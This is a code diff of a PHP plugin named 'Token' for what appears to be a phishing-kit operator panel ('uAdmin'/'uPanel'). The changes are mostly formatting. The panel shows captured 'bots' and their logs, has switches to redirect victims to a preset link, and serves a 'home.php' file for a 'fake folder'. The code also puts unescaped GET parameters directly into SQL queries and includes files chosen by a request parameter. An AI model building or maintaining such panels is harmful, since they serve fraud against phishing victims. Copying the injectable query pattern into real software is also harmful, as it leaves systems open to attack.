@@ -6,7 +6,9 @@ Plugin name:Token;
 
 
 
-if (!defined('UADMIN_AB_ROOT')) {die("You not have permisions");}
+if (!defined('UADMIN_AB_ROOT')) {
+    die("You not have permisions");
+}
 
 ?>
 <link href="<?php echo $k_plugin->url_ ?>css/css.css" rel="stylesheet">
@@ -15,8 +17,7 @@ if (!defined('UADMIN_AB_ROOT')) {die("You not have permisions");}
 
 <?php
 
-$res = $sql->
-    query("select * from sys");
+$res = $sql->query("select * from sys");
 $res    = $res->fetchArray();
 $reg    = $res['reg'];
 $re_all = $res['re_all'];
@@ -31,8 +32,7 @@ if (isset($_GET['real_ui'])) {
     $res        = $sql->query("select rowid from main where ui='$ui' limit 1 ")->fetchArray();
     $ui         = $res[0];
     $_GET['ui'] = $ui; //
-}
-;
+};
 
 //#############################
 
@@ -40,42 +40,42 @@ if (isset($_GET['real_ui'])) {
 if (isset($_GET['ui'])) {
 
     $ui = $_GET['ui'];
-    $res=$sql->query("select * from main where rowid='$ui' limit 1")->fetchArray();
-    $link=$res['link'];
+    $res = $sql->query("select * from main where rowid='$ui' limit 1")->fetchArray();
+    $link = $res['link'];
 
 
 
-    if (isset($_GET['sub']) && file_exists(__dir__."/sub/".$_GET['sub'] . ".php")) {
-
-        
+    if (isset($_GET['sub']) && file_exists(__dir__ . "/sub/" . $_GET['sub'] . ".php")) {
 
 
-        include __dir__."/sub/".$_GET['sub'] . ".php";
+
+
+        include __dir__ . "/sub/" . $_GET['sub'] . ".php";
         exit__();
     }
     include 'op_panel.php';
     exit__();
-
 }
 
 
-    ?>
+?>
 <div class="container-fluid my-3 " ng-app="app" ng-cloak=>
-    
-    
+
+
 
     <div class="alert-danger alert">
-        To avoid errors and panel freeze, empty unwanted logs regularly. There is button to remove empty logs that not have any data. Those  logs need to be removed all the time. Keep panel small and it will be fast
+        To avoid errors and panel freeze, empty unwanted logs regularly. There is button to remove empty logs that not have any data. Those logs need to be removed all the time. Keep panel small and it will be fast
     </div>
-   
+
     <div class="" global_swiches="" style="">
         <table class="table table-striped table-bordered">
             <tr>
                 <td>
-                   <b>Redirect all</b> is ...  <span class="fa fa-question-circle-o float-right" title="Redirect all" data-toggle="popover" data-content="If it set to ON than all EXISTING and NEW bots wil be redirect to preset link on each page" ></span>
+                    <!-- changes f-right -->
+                    <b>Redirect all</b> is ... <span class="fa fa-question-circle-o float-end" title="Redirect all" data-toggle="popover" data-content="If it set to ON than all EXISTING and NEW bots wil be redirect to preset link on each page"></span>
                 </td>
                 <td>
-                    <b>Registration</b> is ... <span class="fa fa-question-circle-o float-right" title="Registration" data-toggle="popover" data-content="If it set to OFF than all NEW bots will be redirected to preset link as soon as they load page. All existing bots will be functional as normal !" ></span>
+                    <b>Registration</b> is ... <span class="fa fa-question-circle-o float-end" title="Registration" data-toggle="popover" data-content="If it set to OFF than all NEW bots will be redirected to preset link as soon as they load page. All existing bots will be functional as normal !"></span>
                 </td>
                 <td>
                     Show only if ...
@@ -110,7 +110,8 @@ if (isset($_GET['ui'])) {
                     </a>
                 </td>
                 <td>
-                    <div class="btn-group btn-group-sm pull-left" role="group">
+                    <!-- changes pull-left to  float  -->
+                    <div class="btn-group btn-group-sm float-start" role="group">
                         <button class="btn btn-outline-danger" onclick="resetall_filters()" type="button">
                             Reset
                         </button>
@@ -127,18 +128,18 @@ if (isset($_GET['ui'])) {
                         <div class="btn-group btn-group-sm linkdropdown" linkfilter="" role="group">
                             <button aria-expanded="false" aria-haspopup="true" class="btn btn-outline-info dropdown-toggle" data-toggle="dropdown" type="button">
                                 ... page ID is
-                                
+
                             </button>
                             <div class="dropdown-menu">
-                                
-                                    <a ng-repeat="link in php_js.links" class="dropdown-item" href="javascript:void(0)" ng-click="ch_link_arr(link, !link.show)" >
-                                        <span class="fa fa-check-square-o linktoglge" ng-show="link.show" style="">
-                                        </span>
-                                        <span class="fa fa-square-o linktoglge" ng-show="!link.show" style="">
-                                        </span>
-                                        {{link.link}}
-                                    </a>
-                                
+
+                                <a ng-repeat="link in php_js.links" class="dropdown-item" href="javascript:void(0)" ng-click="ch_link_arr(link, !link.show)">
+                                    <span class="fa fa-check-square-o linktoglge" ng-show="link.show" style="">
+                                    </span>
+                                    <span class="fa fa-square-o linktoglge" ng-show="!link.show" style="">
+                                    </span>
+                                    {{link.link}}
+                                </a>
+
                             </div>
                         </div>
                     </div>
@@ -152,10 +153,10 @@ if (isset($_GET['ui'])) {
                             <a href="javascript:void(0)" class="dropdown-item" onclick="pre_selected(export_)">
                                 ... selected
                             </a>
-                            <a href="javascript:void(0)" class="dropdown-item  disabled"  onclick="export_not_empty()" >
+                            <a href="javascript:void(0)" class="dropdown-item  disabled" onclick="export_not_empty()">
                                 ... not empty
                             </a>
-                            <a href="javascript:void(0)" class="dropdown-item  disabled"   onclick="export_all()">
+                            <a href="javascript:void(0)" class="dropdown-item  disabled" onclick="export_all()">
                                 ... all
                             </a>
                         </div>
@@ -165,19 +166,19 @@ if (isset($_GET['ui'])) {
                             Delete ...
                         </div>
                         <div class="dropdown-menu">
-                            <a href="javascript:void(0)" class="dropdown-item " onclick="del_()" >
+                            <a href="javascript:void(0)" class="dropdown-item " onclick="del_()">
                                 ... selected
                             </a>
-                            <a href="javascript:void(0)" class="dropdown-item "  onclick="remove_empty()">
+                            <a href="javascript:void(0)" class="dropdown-item " onclick="remove_empty()">
                                 ... empty
                             </a>
-                            <a href="javascript:void(0)" class="dropdown-item "  onclick="remove_all()" >
+                            <a href="javascript:void(0)" class="dropdown-item " onclick="remove_all()">
                                 ... all
                             </a>
                         </div>
                     </div>
 
-                    <a class="btn btn-outline-info btn-sm " data-toggle="popover" title="home.php" data-content="home.php file - file to replace inside in fake folder. Just a simple way to assign path to uPanel" href="<?php echo $k_plugin->ajax_url ?>&proxy">  home.php  <span class="fa fa-download"></span></a>
+                    <a class="btn btn-outline-info btn-sm " data-toggle="popover" title="home.php" data-content="home.php file - file to replace inside in fake folder. Just a simple way to assign path to uPanel" href="<?php echo $k_plugin->ajax_url ?>&proxy"> home.php <span class="fa fa-download"></span></a>
                 </td>
             </tr>
         </table>
